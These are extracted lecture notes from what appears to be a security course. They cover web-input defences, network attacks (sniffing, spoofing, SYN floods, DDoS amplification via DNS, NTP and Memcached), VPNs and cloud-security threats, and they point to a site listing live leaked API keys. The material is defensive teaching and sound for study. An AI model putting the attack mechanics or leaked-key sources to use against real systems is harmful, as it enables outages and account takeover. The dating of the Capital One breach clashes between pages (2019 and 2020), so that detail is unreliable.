discover it in production, you have a crisis: system is compromised, data may be stolen, you must patch urgently, you face 
regulatory fines and lawsuits. SDL shifts security left—finding and fixing vulnerabilities as early as possible.

Security isn't a checkpoint before release. It's a continuous discipline integrated into the entire development lifecycle.

## Original source — PDF page 31

Let's wrap up Part A with the overarching philosophy: "Trust, But Verify." The conflict we've explored is fundamental: 
The web REQUIRES input (without it, there's no functionality—no login, no search, no comments), but input is THE 
attack vector. We can't eliminate input, so we must VERIFY it relentlessly. The betrayal is that attackers disguise 
malicious code as innocent-looking input. The defense is systematic validation, encoding, and defensive programming.

The quote at the bottom is powerful: "We cannot blame the attacker for finding the door we left unlocked." This 
reframes security as YOUR responsibility, not the attacker's morality. If your hospital patient portal has SQL Injection 
vulnerabilities, it's not the hacker's fault for exploiting them—it's YOUR fault for leaving them there. This is harsh but 
necessary. In court, "We didn't know SQL Injection was a thing" is not a valid defense. OWASP Top 10 has been 
published for 20+ years. Parameterized queries have been standard practice for decades. If you're still concatenating 
user input into SQL strings, you're professionally negligent.

Key takeaways for students: (1) Input validation is your first line of defense—allowlist what's acceptable, canonicalize 
before checking. (2) Parameterized queries eliminate SQL Injection—separate code from data, always. (3) Output

## Original source — PDF page 32

encoding prevents XSS—convert <script> to &lt;script&gt;, always. (4) Anti-CSRF tokens prevent request forgery—require 
unpredictable tokens for state-changing actions. (5) Secure Development Lifecycle integrates security at every stage—plan, 
code, test, maintain. These five principles, rigorously applied, eliminate the top three web vulnerabilities. Questions before we 
move to Part B?

## Original source — PDF page 33

Welcome to Part B, where we move from application-layer security (web) to network-layer security (TCP/IP). In Part A, 
we focused on attacks that exploit application logic—SQL Injection, XSS, CSRF. In Part B, we focus on attacks that 
exploit the fundamental design of the internet's communication protocols. The topics we'll cover—Sniffing, 
Spoofing, Denial of Service, VPNs, and IPsec—are about securing the infrastructure that carries data between systems. 
This is critical because even if your web application is perfectly secure, attackers can still compromise you by 
intercepting network traffic, impersonating trusted systems, or flooding you with traffic to cause outages.

Network security is particularly important for healthcare because patient data travels across networks constantly: 
From hospital EHR to cloud storage, from doctor's laptop to database server, from patient's phone to telemedicine 
app. If that network traffic isn't encrypted, attackers can sniff passwords and patient records. If the network doesn't 
verify source addresses, attackers can spoof trusted IP addresses to bypass firewalls. If the network can't handle traffic 
floods, attackers can take down critical systems during emergencies. Part B is about understanding these threats and 
implementing defenses.

## Original source — PDF page 34

The three core threats we'll cover map to the CIA Triad: Sniffing (violates Confidentiality—eavesdropping on 
communications), Spoofing (violates Integrity—impersonating trusted entities), Denial of Service (violates Availability—
preventing legitimate access). By the end of Part B, you'll understand why TCP/IP is inherently insecure, how attackers exploit 
these flaws, and how VPNs and IPsec create secure tunnels over the insecure internet.

## Original source — PDF page 35

This is a fundamental lesson in security: Protocols designed for trust don't work in adversarial environments. You can't assume

benign intent when the network is global and open. Always design with the assumption that attackers will exploit every lack

of verification.

Here's the fundamental problem: TCP/IP was designed in the 1970s-80s in a small, cooperative, trusting academic 
environment (ARPANET—the precursor to the internet). The designers assumed: (1) All participants are trustworthy, 
(2) The network is closed and controlled, (3) Performance matters more than security. These assumptions were 
reasonable for a research network with a few hundred trusted users. But when TCP/IP became the foundation of the 
global internet with billions of untrusted users, these assumptions became catastrophic vulnerabilities. The "original 
sin" is this: There is NO default mechanism in the IP layer to authenticate that a packet actually originated from the 
claimed source address.

Look at the IP packet header diagram. The Source IP Address field is just a value the sender writes. There's no 
cryptographic signature, no central authority verifying it, no authentication protocol. An attacker can set this field to 
ANY value—they can claim to be 192.168.1.1 (a trusted internal IP), 8.8.8.8 (Google's DNS server), or 10.0.0.1 (the 
hospital's database server). The receiving system has NO way to verify the source is legitimate. The internet operates 
on the honor system: you are who you say you are. This is like receiving a letter with a fake return address—there's 
no way to verify the sender's identity just by looking at the envelope.

## Original source — PDF page 36

Why wasn't this fixed? Because retrofitting authentication into TCP/IP would require changing every device on the internet—
billions of routers, switches, servers, and clients. It's technically and economically infeasible. Instead, we layer security ON TOP 
of TCP/IP using protocols like IPsec (which we'll cover at the end of Part B).

This is a fundamental lesson in security: Protocols designed for trust don't work in adversarial environments. You can't 
assume benign intent when the network is global and open. Always design with the assumption that attackers will exploit 
every lack of verification.

## Original source — PDF page 37

The three fundamental network threats correspond directly to the CIA 
Triad: Sniffing violates Confidentiality (eavesdropping on private 
communications), Spoofing violates Integrity (falsifying identity to deceive), and Denial of Service 
(DoS) violates Availability (preventing legitimate access). Let's define each precisely: Sniffing is passive interception—
the attacker listens to network traffic not intended for them, like wiretapping a phone line. It's a passive attack (the 
attacker doesn't modify or block traffic, just reads it), which makes it hard to detect. If an attacker is sniffing your 
hospital's WiFi network, you might never know unless you're monitoring for unusual behavior (like a network card in 
promiscuous mode).

Spoofing is active falsification—the attacker masquerades as a trusted entity to bypass access controls. Example: A 
firewall rule says "Allow database access from IP 192.168.1.10 (the application server)." An attacker spoofs their 
source IP to 192.168.1.10, and the firewall grants access. Spoofing is used for two strategic goals: (1) Exploit trust 
relationships—systems trust certain IPs (internal networks, admin workstations), so attackers impersonate them. 
(2) Hide the origin of an attack—if an attacker spoofs a random IP, it's harder to trace back to them.

## Original source — PDF page 38

Denial of Service (DoS) is resource exhaustion—the attacker floods the target with traffic, consuming bandwidth, CPU, or 
memory until legitimate users can't access the service. Example: A botnet sends millions of requests per second to a hospital's 
patient portal. The web servers are overwhelmed processing fake requests, and real patients can't log in. DoS is 
about availability, not confidentiality or integrity. The attacker doesn't steal data or modify records—they just make the 
system unusable. In healthcare, this can be life-threatening: If a hospital's EHR is down during surgery, doctors can't access 
patient records (allergies, blood type, medication interactions).

## Original source — PDF page 39

21
Assume all network traffic can be sniffed. The only protection is encryption.

Sniffing is the art of eavesdropping on network traffic not intended for you. The technical term is promiscuous 
mode—normally, a network card only processes packets addressed to its MAC address (like only opening mail with 
your name on it). In promiscuous mode, the network card reads ALL packets on the network segment (like reading 
everyone's mail). On shared mediums like WiFi or old Ethernet hubs, all traffic is broadcast to all devices. With a 
network card in promiscuous mode and software like Wireshark, an attacker can capture everything: usernames, 
passwords, patient data, session cookies.

The diagram shows Alice and Bob communicating, and an attacker in the middle capturing their traffic. If Alice sends 
her password to Bob over unencrypted HTTP, the attacker sees: POST /login HTTP/1.1 ... 
username=alice&password=secret123. Game over—the attacker has Alice's credentials. This is why cleartext 
protocols (HTTP, Telnet, FTP, SMTP without TLS) are considered obsolete and dangerous. In a hospital, if a doctor logs 
into the EHR over HTTP on the hospital WiFi, an attacker sniffing the network sees their username and password in 
plaintext.

## Original source — PDF page 40

Sniffing is a passive attack, meaning the attacker doesn't alter or block traffic—they just listen. This makes it extremely hard to 
detect. There's no obvious sign like failed logins or system crashes. The attacker is a ghost. Modern defenses: (1) Encryption—
use HTTPS, TLS, SSH, VPNs so sniffers see encrypted gibberish instead of plaintext. (2) Network segmentation—isolate 
sensitive traffic (like EHR database connections) on separate VLANs so attackers on the public WiFi can't sniff it. (3) Switched 
networks—modern Ethernet switches only forward traffic to the intended recipient, unlike hubs that broadcast to everyone 
(though attackers can still use ARP spoofing to defeat switches).

Assume all network traffic can be sniffed. The only protection is encryption.

## Original source — PDF page 41

IP Spoofing is the attacker's ability to forge the source IP address in packet headers. The diagram shows an attacker 
crossing out their real IP and writing "Trusted Admin IP" in the Source IP field. How do they do this? By using the Raw 
Socket Interface, which allows programs to bypass the operating system's network stack and craft packets manually. 
Normally, when you make a network connection, the OS automatically sets the source IP to your actual IP. With raw 
sockets, you write the entire IP header yourself, including a fake source IP. It's like forging a return address on a letter.

The two strategic goals of IP spoofing: (1) Exploit trust relationships—Many systems trust certain IP addresses. 
Firewalls allow internal IPs (192.168.x.x) but block external IPs. Servers accept commands from admin workstations 
(10.0.1.50) but reject others. If an attacker spoofs an internal or admin IP, they bypass these controls. Example: A 
hospital database accepts connections from IP 10.0.2.10 (the web server) but rejects all others. An attacker 
spoofs 10.0.2.10 and connects directly to the database, bypassing the web application's authentication and 
authorization. (2) Hide the origin of an attack—If an attacker spoofs a random IP (or the victim's own IP), it's much 
harder to trace the attack back to them. Spoofed traffic looks like it came from someone else.

## Original source — PDF page 42

The catch: Spoofing breaks two-way communication. If you spoof your source IP as 8.8.8.8, the server's replies go to 8.8.8.8, 
not to you. You send packets but don't receive responses. This limits spoofing to one-way attacks: Denial of Service (you don't 
need replies, just flood the target), Blind injection (you inject malicious data and don't care about the response), 
and Reflection attacks (you spoof the victim's IP so replies go to the victim, amplifying the attack). Spoofing doesn't work for 
attacks requiring two-way communication (like logging in to steal data)—for that, attackers use other techniques (man-in-the-
middle, session hijacking). Defense: Ingress filtering—routers and firewalls check if source IPs are plausible (don't accept 
internal IPs from the internet).

## Original source — PDF page 43

23
This attack weaponizes the protocol's trust assumption—that clients will complete handshakes they initiate.

Before we discuss attacks, we must understand how TCP connections are established. The TCP three-way 
handshake is the process by which a client and server agree to communicate. (1) SYN (Synchronize): The client sends 
a SYN packet with a random sequence number (seq = x): "I want to connect. My starting sequence number is x." (2) 
SYN-ACK (Synchronize-Acknowledge): The server replies with a SYN-ACK packet: "I acknowledge your SYN (ack = x + 
1). My starting sequence number is y (seq = y). Let's connect." Critically, the server allocates memory and 
resources for this connection (a data structure in the TCP connection table). (3) ACK (Acknowledge): The client sends 
an ACK packet: "I acknowledge your SYN-ACK (ack = y + 1)." The connection is now established, and data can flow.

This three-way handshake is elegant and robust for normal use, but it has a critical vulnerability: The server allocates 
resources (memory) after step 2 (SYN-ACK) but BEFORE step 3 (final ACK). The server trusts that after sending SYN-
ACK, the client will complete the handshake. But what if the client never sends the final ACK? The server waits in a 
"half-open" state, consuming memory. If thousands of clients initiate connections and never complete them, the 
server's TCP connection table fills up, and legitimate users are rejected. This is the basis of SYN Flooding, one of the 
most common DoS attacks.

## Original source — PDF page 44

In a hospital example, imagine the patient portal receives 10,000 SYN packets per second from a botnet. The server dutifully 
responds with 10,000 SYN-ACK packets and allocates memory for 10,000 half-open connections. But the attacker (using 
spoofed source IPs) never sends the final ACK. The connections remain half-open, filling the server's TCP table. After a few 
seconds, the server is out of memory for new connections. Legitimate patients trying to log in send SYN packets, but the 
server can't accept them—it has no room in the connection table. The portal is effectively offline, even though the server is 
still running.

This attack weaponizes the protocol's trust assumption—that clients will complete handshakes they initiate.

## Original source — PDF page 45

SYN Flooding shows how a simple protocol assumption ('clients complete handshakes') becomes a critical vulnerability when

attackers violate that assumption. Always design protocols to be resilient against malicious actors, not just well-behaved

users.

SYN Flooding is a Denial of Service attack that exploits the TCP three-way handshake. The attack mechanics: (1) The 
attacker sends thousands of SYN packets with SPOOFED source IPs (random or targeting another victim). (2) The 
server responds with SYN-ACK packets to those spoofed IPs and allocates memory for each connection. (3) The 
spoofed IPs are nonexistent or don't respond, so the final ACK never arrives. (4) The server RESENDS SYN-ACK 
packets after timeouts (retransmission logic), waiting for the client. (5) Eventually the server's TCP connection table 
fills up (typically 1,000-10,000 half-open connections depending on server capacity), and legitimate connection 
attempts are rejected.

The diagram shows the ﬂow: AƩacker → MulƟple SYN packets (spoofed source IPs) → Server responds with SYN-ACK 
→ Packets sent to spoofed (nonexistent) clients → Server waits, retries, keeps connecƟons half-open. The 
consequence is resource exhaustion—the server's memory and CPU are consumed managing fake connections. A SYN 
flood can take down a web server with a relatively modest number of packets (compared to volumetric floods) 
because each packet consumes server resources disproportionately.

## Original source — PDF page 46

Real-world example: In 1996, the "Panix" attack—a major ISP was taken offline for days by a SYN flood. Modern botnets can 
launch SYN floods of millions of packets per second. The defense we'll discuss shortly is SYN Cookies—a clever technique 
where the server doesn't allocate memory until it receives the final ACK, encoding connection state into the sequence number 
itself. This makes SYN flooding ineffective because the server's resources aren't consumed.

SYN Flooding shows how a simple protocol assumption ('clients complete handshakes') becomes a critical vulnerability 
when attackers violate that assumption. Always design protocols to be resilient against malicious actors, not just well-
behaved users.

## Original source — PDF page 47

25
DDoS is fundamentally about resource asymmetry—attackers harness thousands of devices and massive bandwidth. Defense

requires equivalent scale or clever filtering.

A Denial of Service (DoS) attack from a single source is relatively easy to block—just filter traffic from that IP. But what 
if the attack comes from thousands or millions of sources simultaneously? That's a Distributed Denial of Service 
(DDoS) attack. The architecture has four layers: (1) Attacker (Mastermind)—the person orchestrating the attack. (2) 
Handlers (Command & Control)—servers the attacker controls that send commands to the botnet. (3) Zombies 
(Botnet)—thousands of compromised computers (infected with malware) that execute the attack on command. (4) 
Target (Victim)—the hospital, bank, or service being attacked.

The attacker infects vulnerable computers (often IoT devices with default passwords—routers, webcams, DVRs) with 
malware, creating a botnet. When the attacker wants to launch an attack, they send a command to handlers, which 
relay it to the zombies. Suddenly, 100,000 infected webcams simultaneously start sending HTTP requests to the 
hospital's patient portal. The hospital's firewalls see traffic from 100,000 different IPs—it looks like legitimate users, 
not an attack. The traffic volume overwhelms the network link or server capacity. Why distributed? Two 
reasons: (1) Volume—100,000 devices can generate far more traffic than one device. (2) Obscurity—filtering 100,000 
IPs is impractical, and the true attacker (the mastermind) is hidden behind layers of compromised devices.

## Original source — PDF page 48

Modern DDoS attacks routinely exceed 1 Tbps (terabits per second). In 2016, the Mirai botnet (IoT devices) launched a 1.2 
Tbps attack against Dyn (a DNS provider), taking down major websites (Netflix, Twitter, Reddit) for hours. In 2018, GitHub 
suffered a 1.35 Tbps attack. In healthcare, DDoS can be catastrophic: If a hospital's network is flooded, doctors can't access the 
EHR, labs can't send results, ambulances can't check ER capacity. Defense: DDoS mitigation services (Cloudflare, Akamai) that 
absorb attack traffic using massive distributed infrastructure, rate limiting (limit requests per IP), traffic scrubbing (filter 
malicious traffic at ISP level).

DDoS is fundamentally about resource asymmetry—attackers harness thousands of devices and massive bandwidth. 
Defense requires equivalent scale or clever filtering.

## Original source — PDF page 49

26
Amplification attacks exploit misconfigurations and overly permissive services. Hardening infrastructure (principle of least

access) reduces attack surface.

Reflection and Amplification are techniques that make DDoS attacks even more devastating. Let's define 
each: Reflection means the attacker spoofs the victim's IP address as the source, so third-party servers (innocent 
intermediaries) send their replies to the victim instead of the attacker. The attacker essentially tricks servers into 
attacking the victim on their behalf. Amplification means the attacker exploits protocols where the response is much 
larger than the request. Small input from aƩacker → Intermediary server → Massive output to vicƟm.

Example protocols with high amplification factors: (1) DNS—A 60-byte DNS query can trigger a 4,000-byte response 
(amplification factor: 70x). The attacker sends: "Give me all records for example.com" (small query), and the DNS 
server replies with a huge list (large response). (2) NTP (Network Time Protocol)—A 234-byte request 
(monlist command) can trigger a 48,000-byte response (amplification factor: 200x). (3) Memcached—A 15-byte 
command can trigger a 750KB response (amplification factor: 51,000x). The attacker sends tiny requests spoofed as 
the victim's IP, and servers blast the victim with gigabytes of data.

The combined attack flow: (1) Attacker sends small requests to thousands of DNS/NTP/Memcached servers, spoofing

## Original source — PDF page 50

the victim's IP as the source. (2) Each server sends a large response to the victim. (3) The victim receives gigabits of unsolicited 
traffic from legitimate servers. The victim's network link is saturated, and they can't distinguish legitimate traffic from attack 
traffic because it's all coming from innocent servers. Real-world: The 2018 GitHub attack (1.35 Tbps) used Memcached 
amplification. Defense: (1) Disable vulnerable services (Memcached shouldn't be internet-accessible). (2) Rate limiting on 
servers (don't respond to thousands of requests from one IP). (3) Ingress filtering (don't accept spoofed source IPs).

Amplification attacks exploit misconfigurations and overly permissive services. Hardening infrastructure (principle of least 
access) reduces attack surface.

## Original source — PDF page 51

27
These defenses show a core security principle: When you can't eliminate vulnerabilities (TCP/IP design flaws), mitigate their

impact (filtering, stateless cookies, tunneling).

Now let's shift from attacks to defenses. The slide shows the internet represented as chaotic red lines (hostile 
environment) and a secure tunnel represented as a protective blue pipe (VPN). The core insight: We can't fix the 
internet itself (TCP/IP's design flaws are permanent), so we build secure communication channels ON TOP of the 
insecure internet. This is the philosophy behind VPNs and IPsec. The three defense strategies shown are: (1) Ingress 
Filtering—routers at the network perimeter check source IPs and reject implausible ones (e.g., don't accept packets 
claiming to be from internal IPs if they're coming from the internet). (2) SYN Cookies—a technique to prevent SYN 
flood attacks by encoding connection state into sequence numbers instead of allocating memory. (3) VPNs (Virtual 
Private Networks)—creating encrypted, authenticated tunnels over the public internet.

Ingress filtering is simple but effective: If a packet arrives at your hospital's firewall claiming to be from internal 
IP 192.168.1.50, but it came from the internet, reject it—internal IPs should only originate from inside the network. 
This blocks simple spoofing attacks. ISPs also implement egress filtering (don't let customers send packets with 
spoofed source IPs outside the network), but compliance is inconsistent.

## Original source — PDF page 52

SYN Cookies work by eliminating the need to store half-open connection state. Instead of allocating memory when receiving a 
SYN, the server encodes connection information (IP, port, timestamp) into the sequence number of the SYN-ACK. If the client 
completes the handshake (sends final ACK with the right acknowledgment number), the server can reconstruct the connection 
state from the sequence number. If the client never responds (SYN flood), no resources are consumed. SYN Cookies make SYN 
flooding ineffective, though they slightly impact performance (state reconstruction overhead) and break some TCP options.

These defenses show a core security principle: When you can't eliminate vulnerabilities (TCP/IP design flaws), mitigate their
impact (filtering, stateless cookies, tunneling).

## Original source — PDF page 53

28
VPNs are the standard solution for secure remote access. Every organization with remote workers should mandate VPN use.

A Virtual Private Network (VPN) creates a secure private communication channel over a public insecure 
network (the internet). Think of it as a protective tunnel: your data travels through the internet, but 
it's encapsulated (wrapped in a new packet), encrypted (converted to ciphertext), and authenticated (verified as 
coming from a trusted source). Even if an attacker sniffs the network traffic, they see encrypted gibberish. Even if they 
try to inject or modify packets, authentication detects the tampering. VPNs solve the three network threats: 
(1) Sniffing → EncrypƟon makes sniﬀed traﬃc useless. (2) Spoofing → AuthenƟcaƟon veriﬁes the source. (3) DoS → 
VPNs don't prevent flooding, but they ensure critical traffic is protected.

The three key VPN technologies: (1) Encapsulation—wrapping the original packet (with its headers and data) inside a 
new packet. The outer packet has different source/destination IPs (the VPN endpoints), so intermediate routers see 
only the outer header. The original packet is hidden inside. This is like putting a sealed envelope (original packet) 
inside another envelope (VPN packet). (2) Confidentiality—encrypting the payload so sniffers can't read it. Common 
encryption: AES (Advanced Encryption Standard). Even if an attacker captures VPN traffic, they can't decrypt it without 
the key. (3) Authentication—verifying that packets came from an authorized sender and haven't been tampered with.

## Original source — PDF page 54

Common authentication: HMAC (Hash-based Message Authentication Code) using SHA-256. If an attacker modifies a VPN 
packet, the HMAC verification fails, and the receiver discards it.

A hospital use case: A doctor working from home needs to access the EHR database. Without a VPN, traffic travels over the 
public internet (unencrypted, potentially sniffed). With a VPN, the doctor's laptop establishes a secure tunnel to the hospital's 
VPN gateway. All EHR traffic is encrypted, encapsulated, and authenticated. From the doctor's perspective, it's as if they're on
the hospital's internal network—they can access internal systems securely. From an attacker's perspective, the traffic is 
opaque (encrypted) and unforgeable (authenticated).

VPNs are the standard solution for secure remote access. Every organization with remote workers should mandate VPN 
use.

## Original source — PDF page 55

Welcome to Part C, the final segment of Lecture 4, where we explore Cloud Security. In Parts A and B, we secured the 
application layer (web) and the network layer (TCP/IP). Part C addresses the platform layer—the cloud infrastructure 
where applications run and data is stored. Cloud computing has transformed how organizations operate: Instead of 
building and maintaining physical data centers, hospitals can rent compute, storage, and software from cloud 
providers (AWS, Azure, Google Cloud). This brings immense benefits—scalability, cost efficiency, geographic 
distribution—but also introduces new security challenges that don't exist in traditional on-premises environments.

The core tension in cloud security is the cloud paradox: Ubiquitous Access vs. Physical Control. Cloud gives you 
access from anywhere (doctors can access EHR from home, mobile devices, remote clinics), but you lose physical 
control (servers are in someone else's data center, administrators work for the cloud provider, hardware is shared with 
other tenants). In an on-premises data center, you control physical security (locked doors, guards, video surveillance). 
In the cloud, you trust the provider to handle that. This shift from physical control to contractual trust is fundamental.

The NIST definition shown outlines five essential characteristics of cloud: (1) Broad Network Access (accessible over

## Original source — PDF page 56

the internet), (2) Rapid Elasticity (scale up/down on demand), (3) Measured Service (pay for what you use), (4) On-Demand 
Self-Service (provision resources without human intervention), (5) Resource Pooling (multi-tenancy—multiple customers 
share the same physical infrastructure). By the end of Part C, you'll understand the Shared Responsibility Model (who's 
responsible for what), Cloud-Specific Threats (misconfigurations, insider threats, multi-tenancy risks), and Identity & Data 
Protection strategies.

## Original source — PDF page 57

30
Understanding service and deployment models is critical because your security responsibilities change drastically based on

which model you use.

Let's unpack the cloud paradox further. The slide lists three service models and four deployment models—these are 
the building blocks of cloud architecture. Service Models define WHO manages WHAT: (1) SaaS (Software as a 
Service)—you consume applications (Gmail, Office 365, Salesforce). The provider manages everything: infrastructure, 
OS, middleware, application. You just use it. (2) PaaS (Platform as a Service)—you deploy your own applications on 
the provider's platform (Heroku, Google App Engine). The provider manages infrastructure, OS, runtime; you manage 
your code and data. (3) IaaS (Infrastructure as a Service)—you rent virtual machines, storage, networks (AWS EC2, 
Azure VMs). The provider manages physical hardware; you manage OS, applications, data.

Deployment Models define WHO uses the cloud: (1) Public Cloud (multi-tenant, shared infrastructure—AWS, Azure, 
Google Cloud). (2) Private Cloud (dedicated to one organization, either on-premises or hosted). (3) Hybrid Cloud (mix 
of public and private—e.g., sensitive patient data in private cloud, analytics in public cloud). (4) Community 
Cloud (shared by organizations with common requirements—e.g., healthcare providers sharing HIPAA-compliant 
infrastructure).

## Original source — PDF page 58

For a hospital, the choice matters: SaaS might be used for email (Gmail for Healthcare), scheduling (Calendar). PaaS might host 
a custom patient portal. IaaS might run the EHR database (full control over OS and database software). Deployment: Highly 
sensitive patient data (genetic records, psychiatric notes) might stay in a private cloud (compliance, control). Less sensitive 
workloads (appointment scheduling, billing analytics) might use public cloud (cost, scalability). The paradox: The more you 
move to the cloud (especially public/SaaS), the more ubiquitous access you gain, but the less physical control you have.

Understanding service and deployment models is critical because your security responsibilities change drastically based on 
which model you use.

## Original source — PDF page 59

When there's a breach, executives often blame the cloud provider. But 95% of cloud breaches are due to customer

misconfiguration or poor identity management, not provider failures. Know your responsibilities.

The Shared Responsibility Model is the most important concept in cloud security. It defines the security 
boundary between the cloud provider's responsibilities and the customer's responsibilities. The table shows a clear 
pattern: The provider always manages the lower layers (networking, servers, storage, virtualization). The customer's 
responsibilities increase as you move from SaaS to PaaS to IaaS. And critically: DATA & IDENTITY are ALWAYS YOUR 
RESPONSIBILITY, regardless of service model. This is highlighted in bold across all three columns.

Let's walk through each model: (1) SaaS (Salesforce, Office 365)—The provider manages everything from networking 
to applications. You ONLY manage your data (what you store in Salesforce) and identity (who has access). You don't 
patch the OS, update the application, configure firewalls—the provider does that. (2) PaaS (Heroku, App Engine)—The 
provider manages infrastructure, OS, runtime, middleware. You manage applications (your code) and data. You choose 
libraries, configure application settings, manage databases. (3) IaaS (AWS EC2, Azure VMs)—The provider manages 
hardware, virtualization, networking. You manage OS, middleware, runtime, applications, data. You patch the OS, 
configure firewalls, harden the system. It's like renting a bare-metal server—you control everything above the 
hypervisor.

## Original source — PDF page 60

The key insight: The more control you have, the more responsibility. IaaS gives you maximum flexibility (run any OS, any 
software), but you're responsible for securing it. SaaS gives you minimal control (you can't change the application code), but 
the provider handles most security. The critical phrase: "DATA & IDENTITY: ALWAYS YOUR RESPONSIBILITY." No matter which 
model you use, YOU decide who accesses what data. If you configure your S3 bucket as publicly readable (misconfiguration), 
that's YOUR failure, not AWS's. If an employee steals patient data and sells it (insider threat), that's YOUR failure. The provider 
secures the infrastructure; you secure your use of it.

When there's a breach, executives often blame the cloud provider. But 95% of cloud breaches are due to customer 
misconfiguration or poor identity management, not provider failures. Know your responsibilities.

## Original source — PDF page 61

32
The Pandemic Eleven aren't theoretical—they're based on actual cloud breaches. The CSA publishes annual reports

documenting each threat with real-world examples.

The Pandemic Eleven is a term coined by the Cloud Security Alliance (CSA) to describe the 11 most critical cloud 
security threats. We'll focus on four highlighted in the slide: (1) ABUSE/NEFARIOUS USE—Attackers rent cloud 
resources (virtual machines, storage) to launch attacks. Example: Renting AWS EC2 instances to run a botnet that 
launches DDoS attacks. The attacker benefits from cloud scalability and anonymity (hard to trace back). Cloud 
providers try to detect and block abuse, but it's cat-and-mouse. (2) INSECURE APIs (highlighted in orange)—Cloud 
services expose APIs for management (creating VMs, accessing storage, managing users). If these APIs have weak 
authentication, lack encryption, or have vulnerabilities, attackers can abuse them. Example: An AWS S3 bucket API 
with no authentication allows anyone to read patient data. This is the #1 cause of cloud breaches.

(3) DATA LOSS (highlighted in orange)—Unrecoverable records (provider failure, accidental deletion) or unauthorized 
leakage (misconfigured permissions). Example: A hospital deletes a VM that contained the only copy of patient 
backups. Or a developer accidentally uploads patient data to a public GitHub repo. Unlike on-premises, you don't 
control the physical disks—you trust the provider's redundancy. But accidental deletion or misconfiguration is YOUR 
risk. (4) UNKNOWN RISK PROFILE—When you move to the cloud, you cede some control, which means accepting

## Original source — PDF page 62

risks you can't fully assess. Example: You don't know if the cloud provider's employees are properly vetted. You don't know if 
their data centers have physical security flaws. You read their security certifications (SOC 2, ISO 27001), but you're trusting 
attestations, not verifying personally.

The radar chart visualizes the threat landscape—each spoke represents a threat category. The two highlighted in orange 
(Insecure APIs and Data Loss) are the most prevalent in real breaches. Other threats include: Malicious Insiders (provider 
employees or your own), Account Hijacking (stolen credentials), Shared Tech Vulnerabilities (multi-tenancy flaws—we'll 
discuss next).

The Pandemic Eleven aren't theoretical—they're based on actual cloud breaches. The CSA publishes annual reports 
documenting each threat with real-world examples.

## Original source — PDF page 63

Example: An API accepts requests without 
verifying credentials. An attacker calls the API

directly (bypassing the web UI) and creates

admin accounts, reads sensitive data, or 
deletes resources. Or: API uses API keys that

are hardcoded in GitHub repos (developers

accidentally commit them), and attackers 
scrape GitHub for exposed keys (see next slide)

Example: A hospital patient portal uses a third-

party appointment scheduling API. That API is

compromised, and attackers use it to access

patient data via the dependency chain.

APIs that don't use HTTPS (TLS encryption) transmit credentials 
and data in plaintext. An attacker sniffing network traffic (via 
WiFi, compromised router, or malicious ISP) sees API keys, 
session tokens, and sensitive data. This should be inexcusable in 
2024, but surprisingly, some internal APIs (between 
microservices) still use HTTP because developers assume 
"internal networks are safe" (they're not).

Let's dive deeper into Insecure APIs, the silent killer responsible for the majority of cloud breaches. Cloud providers 
expose APIs for everything: creating VMs, accessing storage buckets, managing user permissions, configuring 
networks. These APIs are powerful—they're the control plane of your cloud infrastructure. If an attacker compromises 
an API, they control your entire cloud environment. Three common flaws: (1) Broken Authentication—Weak access 
controls allow policy circumvention. Example: An API accepts requests without verifying credentials. An attacker calls 
the API directly (bypassing the web UI) and creates admin accounts, reads sensitive data, or deletes resources. Or: API 
uses API keys that are hardcoded in GitHub repos (developers accidentally commit them), and attackers scrape GitHub 
for exposed keys.

(2) Cleartext Transmission—APIs that don't use HTTPS (TLS encryption) transmit credentials and data in plaintext. An 
attacker sniffing network traffic (via WiFi, compromised router, or malicious ISP) sees API keys, session tokens, and 
sensitive data. This should be inexcusable in 2024, but surprisingly, some internal APIs (between microservices) still 
use HTTP because developers assume "internal networks are safe" (they're not). (3) Dependency Chains—Modern 
applications depend on dozens of third-party APIs (payment processors, geolocation, analytics). If a third-party API is

## Original source — PDF page 64

breached, it can compromise YOUR service. Example: A hospital patient portal uses a third-party appointment scheduling API. 
That API is compromised, and attackers use it to access patient data via the dependency chain.

Real-world breaches caused by insecure APIs: Capital One (2019)—A misconfigured AWS Web Application Firewall allowed an 
attacker to call AWS metadata APIs from an EC2 instance, stealing credentials and accessing 100M credit card 
applications. Uber (2016)—API keys hardcoded in a GitHub repo allowed attackers to access AWS S3 buckets containing 57M 
customer records. Facebook (2018)—An API flaw allowed attackers to generate access tokens for other users, compromising 
50M accounts. The pattern: APIs are the keys to the kingdom, and if those keys are left lying around (weak auth, cleartext, 
hardcoded), attackers pick them up. Defense: (1) Strong authentication (OAuth 2.0, API gateways), (2) Always use TLS, (3) 
Rate limiting and monitoring, (4) Secret management (never hardcode keys, use vaults like HashiCorp Vault).

## Original source — PDF page 65

https://unsecuredapikeys.com/

34
It’s a website that specifically tracks, lists, and verifies live API

keys accidentally pushed to public GitHub repositories

## Original source — PDF page 66

35
Insider threats are hard to defend against because insiders have legitimate access. The goal is to limit the blast radius (what

one compromised account can do) and detect abuse quickly.

The Insider Threat is unique to cloud because there are TWO categories of insiders: YOUR employees and THE 
PROVIDER'S employees. Let's break down each: (1) Malicious Insider—Administrators or Managed Security Service 
Providers (MSSPs) abusing "God-mode" privileges. In a hospital, a disgruntled cloud admin (with root access to all 
VMs) could exfiltrate the entire patient database, delete backups for ransom, or sell access to competitors. In the 
cloud, this risk extends to the provider's employees. Cloud provider staff (engineers, support, security teams) often 
have access to customer environments for troubleshooting. What if a rogue AWS employee reads your patient data? 
Providers claim strong controls (background checks, least privilege, audit logging), but you're trusting attestations.

(2) Negligent Insider—Accidental exposure via misconfiguration or phishing. This is FAR more common than malicious 
insiders. Example: A developer accidentally sets an S3 bucket's permissions to "public read" because they're testing 
something and forget to change it back. Now 10 million patient records are publicly accessible. Or: A hospital admin 
falls for a phishing email, and the attacker steals their cloud admin credentials. The attacker logs in and creates new 
admin accounts, exfiltrates data, and plants backdoors. In 2020, Capital One breach was caused by a misconfigured 
firewall (negligence, not malice). In 2019, Elasticsearch databases (used by hospitals) were exposed publicly because

## Original source — PDF page 67

admins didn't configure authentication (negligence).

(3) Provider Risk—The risk of Cloud Service Provider (CSP) employees accessing tenant data. Legally, providers have 
contractual and regulatory obligations (HIPAA, GDPR) not to access customer data. In practice, some access is necessary 
(troubleshooting, compliance audits). Providers use controls: Audit logging (every admin action logged), Just-in-time 
access (temporary elevated privileges), Separation of duties (no single employee has full access). But the risk remains: A 
sophisticated insider (or attacker who compromises a provider employee's account) could access data. Defense: (1) Encrypt 
data at rest with customer-managed keys (provider can't decrypt without your keys), (2) Monitor audit logs for unusual 
admin activity, (3) Least privilege (limit who has cloud admin access).

Insider threats are hard to defend against because insiders have legitimate access. The goal is to limit the blast radius 
(what one compromised account can do) and detect abuse quickly.

